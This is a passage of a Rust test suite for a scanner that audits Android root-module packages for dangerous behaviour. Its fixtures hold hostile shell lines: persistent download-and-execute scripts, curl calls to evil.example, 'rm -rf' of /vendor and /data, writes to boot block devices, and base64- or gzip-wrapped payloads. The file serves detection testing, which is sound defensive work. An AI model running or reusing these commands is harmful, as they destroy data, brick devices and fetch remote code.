            host.push('\n');
            install.push_str(&format!(
                "c{index}=$(sed -n '{}p' \"$0\" | cut -c 2)\n",
                index + 2
            ));
            expansion.push_str(&format!("$c{index}"));
        }
        install.push_str(&format!(
            "echo -n \"{expansion}\" > /data/generated.sh\nsource /data/generated.sh\n"
        ));
        let zip = module_zip(&[
            ("module.prop", b"id=self_indexed\n"),
            ("META-INF/com/google/android/update-binary", host.as_bytes()),
            ("install.sh", install.as_bytes()),
        ]);
        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
        let finding = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_PARTITION_WRITE)
            .unwrap();
        assert_eq!(finding.severity, Severity::Critical);
        assert!(
            finding
                .provenance
                .iter()
                .any(|value| value.contains("self-indexed generated script"))
        );
    }

    #[test]
    fn detects_persistent_remote_download_and_execution() {
        let script = b"#!/system/bin/sh\ncat <<'EOF' > /data/adb/service.d/agent.sh\n#!/system/bin/sh\nURL=https://example.com/payload\ncurl -o /data/agent.sh $URL\nchmod +x /data/agent.sh\n/data/agent.sh\nEOF\n";
        let report = scan_file_bytes("customize.sh", script, &AuditConfig::default());
        let finding = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_REMOTE_EXECUTION)
            .unwrap();
        assert_eq!(finding.severity, Severity::Critical);
        assert!(finding.title.contains("Persistent root script"));
    }

    #[test]
    fn download_without_execution_is_not_remote_execution() {
        let script =
            b"#!/system/bin/sh\ncurl -o $MODPATH/list.json https://example.com/list.json\n";
        let report = scan_file_bytes("customize.sh", script, &AuditConfig::default());
        assert!(rules(&report).contains(&RULE_NETWORK));
        assert!(!rules(&report).contains(&RULE_REMOTE_EXECUTION));
        assert!(!report.has_critical());
    }

    #[test]
    fn follows_block_target_through_for_loop() {
        let script = b"#!/system/bin/sh\ndevices=$(ls /dev/block/sd*)\nfor device in $devices; do\necho corrupt | cat >$device\ndone\n";
        let report = scan_file_bytes("customize.sh", script, &AuditConfig::default());
        assert!(rules(&report).contains(&RULE_PARTITION_WRITE));
    }

    #[test]
    fn audits_lone_carriage_return_shell_lines() {
        let script = b"#!/system/bin/sh\rdd if=/dev/zero of=/dev/block/by-name/boot\r";
        let report = scan_file_bytes("customize.sh", script, &AuditConfig::default());
        assert!(rules(&report).contains(&RULE_PARTITION_WRITE));
    }

    #[test]
    fn unpacking_limit_is_reported() {
        let packed = gzexe(&gzexe(b"#!/system/bin/sh\necho done\n"));
        let config = AuditConfig {
            max_unpack_depth: 1,
            ..AuditConfig::default()
        };
        let report = scan_file_bytes("service.sh", &packed, &config);
        assert!(rules(&report).contains(&RULE_UNPACK_LIMIT));
    }

    #[test]
    fn corrupt_gzip_is_reported_as_uninspectable() {
        let report = scan_file_bytes(
            "service.sh.gz",
            b"\x1f\x8bthis is not a gzip stream",
            &AuditConfig::default(),
        );
        let finding = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_UNPACK_LIMIT)
            .unwrap();
        assert_eq!(finding.severity, Severity::High);
    }

    #[test]
    fn audits_static_base64_shell_payload() {
        let script = b"#!/system/bin/sh\necho 'cm0gLXJmIC9kYXRhCg==' | base64 -d | sh\n";
        let report = scan_file_bytes("service.sh", script, &AuditConfig::default());
        assert!(rules(&report).contains(&RULE_PACKED_SHELL));
        let delete = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_BROAD_DELETE)
            .unwrap();
        assert_eq!(delete.provenance, ["base64 shell payload (layer 1)"]);
    }

    #[test]
    fn audits_renamed_openssl_base64_grammar() {
        let decoder = elf_with_markers(b"stripped");
        let zip = module_zip(&[
            ("module.prop", b"id=renamed_decoder\n"),
            (
                "customize.sh",
                b"#!/system/bin/sh\nPAYLOAD=cm0gLXJmIC92ZW5kb3IK\nDECODER=$MODPATH/bin/a\necho \"$PAYLOAD\" | \"$DECODER\" enc -d -base64 | sh\n",
            ),
            ("bin/a", &decoder),
        ]);
        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
        let delete = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_BROAD_DELETE && !finding.provenance.is_empty())
            .unwrap();
        assert_eq!(delete.provenance, ["heuristic base64 payload (layer 1)"]);
    }

    #[test]
    fn audits_renamed_decoder_using_binary_fingerprint() {
        let decoder = elf_with_markers(b"usage: codec --decode base64");
        let zip = module_zip(&[
            ("module.prop", b"id=fingerprinted_decoder\n"),
            (
                "service.sh",
                b"#!/system/bin/sh\necho cm0gLXJmIC9kYXRhCg | $MODPATH/bin/codec -d | sh\n",
            ),
            ("bin/codec", &decoder),
        ]);
        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
        assert!(report.findings.iter().any(|finding| {
            finding.rule_id == RULE_BROAD_DELETE && !finding.provenance.is_empty()
        }));
    }

    #[test]
    fn audits_base64_without_padding() {
        let report = scan_file_bytes(
            "service.sh",
            b"#!/system/bin/sh\necho cm0gLXJmIC9kYXRhCg | base64 --decode | sh\n",
            &AuditConfig::default(),
        );
        assert!(report.findings.iter().any(|finding| {
            finding.rule_id == RULE_BROAD_DELETE && !finding.provenance.is_empty()
        }));
        assert_eq!(decode_base64("_w"), Some(vec![0xff]));
    }

    #[test]
    fn discovers_payload_without_decoder_command() {
        let report = scan_file_bytes(
            "customize.sh",
            b"#!/system/bin/sh\nPAYLOAD=IyEvc3lzdGVtL2Jpbi9zaApybSAtcmYgL3ZlbmRvcgpjdXJsIGh0dHBzOi8vZXZpbC5leGFtcGxlL3AK\nrun_custom_format \"$PAYLOAD\"\n",
            &AuditConfig::default(),
        );
        let delete = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_BROAD_DELETE && !finding.provenance.is_empty())
            .unwrap();
        assert_eq!(
            delete.provenance,
            ["content-discovered base64 payload (layer 1)"]
        );
        assert!(
            report.findings.iter().any(|finding| {
                finding.rule_id == RULE_NETWORK && !finding.provenance.is_empty()
            })
        );
    }

    #[test]
    fn discovers_concatenated_and_nested_payload() {
        let report = scan_file_bytes(
            "service.sh",
            b"#!/system/bin/sh\nA=SXlFdmMzbHpkR1Z0TDJKcGJpOXphQXB5\nB=YlNBdGNtWWdMM1psYm1SdmNnbz0=\nPAYLOAD=$A$B\nunknown_runner $PAYLOAD\n",
            &AuditConfig::default(),
        );
        let delete = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_BROAD_DELETE && !finding.provenance.is_empty())
            .unwrap();
        assert_eq!(delete.provenance.len(), 2);
        assert!(
            delete
                .provenance
                .iter()
                .all(|layer| layer.starts_with("content-discovered base64 payload"))
        );
    }

    #[test]
    fn discovers_payload_in_non_script_archive_file() {
        let zip = module_zip(&[
            ("module.prop", b"id=content_payload\n"),
            (
                "payload.dat",
                b"IyEvc3lzdGVtL2Jpbi9zaApybSAtcmYgL3ZlbmRvcgpjdXJsIGh0dHBzOi8vZXZpbC5leGFtcGxlL3AK",
            ),
        ]);
        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
        assert!(report.findings.iter().any(|finding| {
            finding.path == "payload.dat"
                && finding.rule_id == RULE_BROAD_DELETE
                && !finding.provenance.is_empty()
        }));
    }

    #[test]
    fn discovers_base64_wrapped_gzip_payload() {
        let report = scan_file_bytes(
            "payload.txt",
            b"H4sIAAAAAAAAA1NW1C+uLC5JzdVPyszTL87gSklRyEyzrVDIT7PVT0kt00/KyU/O1k+q1M1LzE3VT8rPL+ECAB6Yrwo0AAAA",
            &AuditConfig::default(),
        );
        assert!(report.findings.iter().any(|finding| {
            finding.rule_id == RULE_PARTITION_WRITE && finding.provenance.len() == 2
        }));
    }

    #[test]
    fn ignores_harmless_base64_content() {
        let report = scan_file_bytes(
            "README.txt",
            b"VGhpcyBpcyBhIGhhcm1sZXNzIGRvY3VtZW50YXRpb24gc3RyaW5nLg==\niVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=\n",
            &AuditConfig::default(),
        );
        assert!(report.findings.is_empty());
        assert_eq!(report.derived_artifacts, 0);
    }

    #[test]
    fn audits_script_copied_into_service_directory() {
        let zip = module_zip(&[
            ("module.prop", b"id=persistent_copy\n"),
            (
                "customize.sh",
                b"#!/system/bin/sh\ncp $MODPATH/scripts/late.sh /data/adb/service.d/\n",
            ),
            (
                "scripts/late.sh",
                b"#!/system/bin/sh\nrm -rf /vendor\ncurl https://evil.example/p\n",
            ),
        ]);
        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
        assert!(rules(&report).contains(&RULE_PERSISTENT_SCRIPT));
        assert!(report.findings.iter().any(|finding| {
            finding.path == "/data/adb/service.d/late.sh"
                && finding.rule_id == RULE_BROAD_DELETE
                && !finding.provenance.is_empty()
        }));
        assert!(report.findings.iter().any(|finding| {
            finding.path == "/data/adb/service.d/late.sh"
                && finding.rule_id == RULE_NETWORK
                && !finding.provenance.is_empty()
        }));
    }

    #[test]
    fn audits_base64_output_written_to_boot_completed_directory() {
        let report = scan_file_bytes(
            "customize.sh",
            b"#!/system/bin/sh\necho cm0gLXJmIC92ZW5kb3IK | base64 -d > /data/adb/boot-completed.d/late.sh\n",
            &AuditConfig::default(),
        );
        assert!(report.findings.iter().any(|finding| {
            finding.path == "/data/adb/boot-completed.d/late.sh"
                && finding.rule_id == RULE_BROAD_DELETE
                && finding
                    .provenance
                    .iter()
                    .any(|layer| layer.contains("persistent startup script"))
        }));
    }

    #[test]
    fn keeps_legacy_bootcompleted_directory_compatibility() {
        assert_eq!(
            persistent_destination("/data/adb/boot-completed.d/legacy", None),
            Some("/data/adb/boot-completed.d/legacy".to_owned())
        );
    }

    #[test]
    fn recursively_audits_invoked_extensionless_scripts() {
        let zip = module_zip(&[
            ("module.prop", b"id=script_chain\n"),
            (
                "service.sh",
                b"#!/system/bin/sh\nMODDIR=${0%/*}\nsh $MODDIR/scripts/worker\n",
            ),
            ("scripts/worker", b"source $MODPATH/scripts/leaf\n"),
            ("scripts/leaf", b"rm -rf /vendor\n"),
        ]);
        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
        assert_eq!(
            report
                .findings
                .iter()
                .filter(|finding| finding.rule_id == RULE_INVOKED_SCRIPT)
                .count(),
            2
        );
        let delete = report
            .findings
            .iter()
            .find(|finding| finding.path == "scripts/leaf" && finding.rule_id == RULE_BROAD_DELETE)
            .unwrap();
        assert_eq!(delete.provenance.len(), 2);
    }

    #[test]
    fn audits_standard_module_script_names() {
        let zip = module_zip(&[
            ("module.prop", b"id=standard_scripts\n"),
            ("post-fs-data.sh", b"curl https://post-fs.example\n"),
            ("post-mount.sh", b"curl https://post-mount.example\n"),
            ("service.sh", b"curl https://service.example\n"),
            (
                "boot-completed.sh",
                b"curl https://boot-completed.example\n",
            ),
            ("uninstall.sh", b"curl https://uninstall.example\n"),
            ("action.sh", b"curl https://action.example\n"),
        ]);
        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
        let paths: BTreeSet<_> = report
            .findings
            .iter()
            .filter(|finding| finding.rule_id == RULE_NETWORK)
            .map(|finding| finding.path.as_str())
            .collect();
        assert_eq!(
            paths,
            BTreeSet::from([
                "action.sh",
                "boot-completed.sh",
                "post-fs-data.sh",
                "post-mount.sh",
                "service.sh",
                "uninstall.sh",
            ])
        );
    }

    #[test]
    fn audits_persistent_heredoc_body() {
        let report = scan_file_bytes(
            "customize.sh",
            b"#!/system/bin/sh\ncat > /data/adb/service.d/generated <<'EOF'\ndd if=x of=/dev/block/by-name/boot\nEOF\nchmod 0755 /data/adb/service.d/generated\n",
            &AuditConfig::default(),
        );
        assert!(report.findings.iter().any(|finding| {
            finding.path == "/data/adb/service.d/generated"
                && finding.rule_id == RULE_PARTITION_WRITE
        }));
        assert!(!rules(&report).contains(&RULE_UNAUDITABLE_PERSISTENT_SCRIPT));
    }

    #[test]
    fn warns_when_persistent_script_content_is_dynamic() {
        let report = scan_file_bytes(
            "customize.sh",
            b"#!/system/bin/sh\ngenerate_runtime_script > /data/adb/service.d/dynamic.sh\n",
            &AuditConfig::default(),
        );
        let finding = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_UNAUDITABLE_PERSISTENT_SCRIPT)
            .unwrap();
        assert_eq!(finding.severity, Severity::High);
        assert!(finding.evidence.contains("/data/adb/service.d/dynamic.sh"));
    }

    #[test]
    fn does_not_cross_statement_boundaries_for_decoder_input() {
        let report = scan_file_bytes(
            "service.sh",
            b"#!/system/bin/sh\necho cm0gLXJmIC92ZW5kb3IK; base64 -d | sh\n",
            &AuditConfig::default(),
        );
        assert!(!report.findings.iter().any(|finding| {
            finding.rule_id == RULE_BROAD_DELETE && !finding.provenance.is_empty()
        }));
    }

    #[test]
    fn audits_static_archive_input_to_renamed_decoder() {
        let decoder = elf_with_markers(b"stripped");
        let zip = module_zip(&[
            ("module.prop", b"id=archive_input\n"),
            (
                "customize.sh",
                b"#!/system/bin/sh\n$MODPATH/bin/filter base64 -d -in payload.txt | sh\n",
            ),
            ("payload.txt", b"cm0gLXJmIC92ZW5kb3IK"),
            ("bin/filter", &decoder),
        ]);
        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
        assert!(report.findings.iter().any(|finding| {
            finding.rule_id == RULE_BROAD_DELETE && !finding.provenance.is_empty()
        }));
    }

    #[test]
    fn warns_when_bundled_decoder_output_is_unknown() {
        let decoder = elf_with_markers(b"custom unpacker");
        let zip = module_zip(&[
            ("module.prop", b"id=unknown_decoder\n"),
            (
                "customize.sh",
                b"#!/system/bin/sh\ncat $DYNAMIC_PAYLOAD | $MODPATH/bin/unpack -d | sh\n",
            ),
            ("bin/unpack", &decoder),
        ]);
        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
        let finding = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_UNAUDITABLE_DECODER)
            .unwrap();
        assert_eq!(finding.severity, Severity::High);
    }

    #[test]
    fn encrypted_openssl_payload_is_not_misreported_as_base64() {
        let report = scan_file_bytes(
            "customize.sh",
            b"#!/system/bin/sh\necho U2FsdGVkX1+payload | tool enc -d -aes-256-cbc -a -pass pass:x | sh\n",
            &AuditConfig::default(),
        );
        assert!(rules(&report).contains(&RULE_UNAUDITABLE_DECODER));
        assert_eq!(report.derived_artifacts, 0);
    }

    #[test]
    fn audits_literal_shell_command() {
        let script = b"#!/system/bin/sh\nsh -c 'rm -rf /vendor'\n";
        let report = scan_file_bytes("service.sh", script, &AuditConfig::default());
        let delete = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_BROAD_DELETE && !finding.provenance.is_empty())
            .unwrap();
        assert_eq!(delete.provenance, ["literal dynamic shell (layer 1)"]);
    }

    #[test]
    fn follows_find_block_assignment() {
        let script = b"#!/system/bin/sh\nBOOT=$(find_block boot)\ndd if=boot.img of=$BOOT\n";
        let report = scan_file_bytes("customize.sh", script, &AuditConfig::default());
        assert!(rules(&report).contains(&RULE_PARTITION_WRITE));
    }

    #[test]
    fn detects_redirection_to_block_device() {
        let script = b"#!/system/bin/sh\ngzip -dc boot.img.gz > /dev/block/by-name/boot\n";
        let report = scan_file_bytes("customize.sh", script, &AuditConfig::default());
        assert!(rules(&report).contains(&RULE_PARTITION_WRITE));
    }

    #[test]
    fn warns_about_partition_alias_flash_tool() {
        let script = b"#!/system/bin/sh\nflash_image boot boot.img\n";
        let report = scan_file_bytes("customize.sh", script, &AuditConfig::default());
        assert!(rules(&report).contains(&RULE_FLASH_TOOL));
    }

    #[test]
    fn correlates_binary_presence_and_execution() {
        let mut elf = vec![0_u8; 64];
        elf[..6].copy_from_slice(b"\x7fELF\x02\x01");
        elf[16..18].copy_from_slice(&2_u16.to_le_bytes());
        let zip = module_zip(&[
            ("module.prop", b"id=audit_binary\n"),
            (
                "service.sh",
                b"#!/system/bin/sh\n$MODPATH/bin/helper --start\n",
            ),
            ("bin/helper", &elf),
        ]);
        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
        assert!(rules(&report).contains(&RULE_BINARY_PRESENT));
        assert!(rules(&report).contains(&RULE_BINARY_EXECUTED));
    }

    #[test]
    fn binary_verification_and_cleanup_are_not_execution() {
        let elf = elf_with_markers(b"zygisk_module_entry");
        let zip = module_zip(&[
            ("module.prop", b"id=verify_binary\n"),
            (
                "customize.sh",
                b"#!/system/bin/sh\ndo_verify zygisk/arm64-v8a.so deadbeef\nrm -f $MODPATH/zygisk/arm64-v8a.so\n",
            ),
            ("zygisk/arm64-v8a.so", &elf),
        ]);
        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
        assert!(rules(&report).contains(&RULE_BINARY_PRESENT));
        assert!(!rules(&report).contains(&RULE_BINARY_EXECUTED));
    }

    #[test]
    fn audits_an_installed_module_directory() {
        let temp = tempfile::tempdir().unwrap();
        std::fs::write(temp.path().join("module.prop"), b"id=installed_scan\n").unwrap();
        std::fs::create_dir(temp.path().join("scripts")).unwrap();
        std::fs::write(
            temp.path().join("service.sh"),
            b"#!/system/bin/sh\n$MODDIR/scripts/worker\n",
        )
        .unwrap();
        std::fs::write(
            temp.path().join("scripts/worker"),
            b"#!/system/bin/sh\ncurl https://example.invalid/ping\n",
        )
        .unwrap();

        let report = scan_directory_path(temp.path(), &AuditConfig::default()).unwrap();
        assert_eq!(report.module_id.as_deref(), Some("installed_scan"));
        assert_eq!(report.scanned_files, 3);
        assert!(rules(&report).contains(&RULE_NETWORK));
        assert!(
            report
                .findings
                .iter()
                .any(|finding| finding.path == "scripts/worker")
        );
    }

    #[cfg(unix)]
    #[test]
    fn installed_directory_scan_does_not_follow_symlinks() {
        use std::os::unix::fs::symlink;

        let temp = tempfile::tempdir().unwrap();
        let outside = tempfile::NamedTempFile::new().unwrap();
        std::fs::write(temp.path().join("module.prop"), b"id=symlink_scan\n").unwrap();
        std::fs::write(outside.path(), b"curl https://outside.invalid\n").unwrap();
        symlink(outside.path(), temp.path().join("service.sh")).unwrap();

        let report = scan_directory_path(temp.path(), &AuditConfig::default()).unwrap();
        assert!(!rules(&report).contains(&RULE_NETWORK));
        assert!(rules(&report).contains(&RULE_UNINSPECTABLE_SYMLINK));
        assert_eq!(report.scanned_files, 1);
    }

    #[test]
    fn readme_url_is_not_network_behavior() {
        let report = scan_file_bytes(
            "README.md",
            b"Documentation: https://example.com\n",
            &AuditConfig::default(),
        );
        assert!(!rules(&report).contains(&RULE_NETWORK));
        assert_eq!(report.required_confirmation_presses(), 0);
    }

    #[test]
    fn local_network_tool_operations_are_not_outbound_behavior() {
        let report = scan_file_bytes(
            "service.sh",
            b"#!/system/bin/sh\ngit status\ngit apply local.patch\ncurl --version\ncurl -o copy file:///data/local/tmp/source\n",
            &AuditConfig::default(),
        );
        assert!(!rules(&report).contains(&RULE_NETWORK));

        let report = scan_file_bytes(
            "service.sh",
            b"#!/system/bin/sh\ngit fetch origin\ncurl https://example.invalid/payload\n",
            &AuditConfig::default(),
        );
        assert_eq!(
            report
                .findings
                .iter()
                .filter(|finding| finding.rule_id == RULE_NETWORK)
                .count(),
            2
        );
    }

    #[test]
    fn binary_network_requires_structural_client_evidence() {
        let imports = BTreeSet::from(["connect"]);
        assert!(network_evidence_from_elf_metadata(&imports, &BTreeSet::new()).is_none());

        let imports = BTreeSet::from(["connect", "getaddrinfo"]);
        let evidence = network_evidence_from_elf_metadata(&imports, &BTreeSet::new()).unwrap();
        assert!(evidence.contains("connect"));
        assert!(evidence.contains("getaddrinfo"));

        let imports = BTreeSet::from(["curl_easy_perform"]);
        assert!(network_evidence_from_elf_metadata(&imports, &BTreeSet::new()).is_some());

        let libraries = BTreeSet::from(["libcurl.so.4".to_owned()]);
        assert!(network_evidence_from_elf_metadata(&BTreeSet::new(), &libraries).is_some());
    }

    #[test]
    fn binary_network_ignores_incidental_strings_and_relocatable_elf() {
        let binary = elf_with_markers(
            b"https://android.googlesource.com/toolchain/llvm-project\0connector connected\0",
        );
        let report = scan_file_bytes("bin/tool", &binary, &AuditConfig::default());
        assert!(!rules(&report).contains(&RULE_BINARY_NETWORK));

        let mut relocatable = binary;
        relocatable[16..18].copy_from_slice(&goblin::elf::header::ET_REL.to_le_bytes());
        assert!(binary_network_evidence(&relocatable).is_none());
    }
}
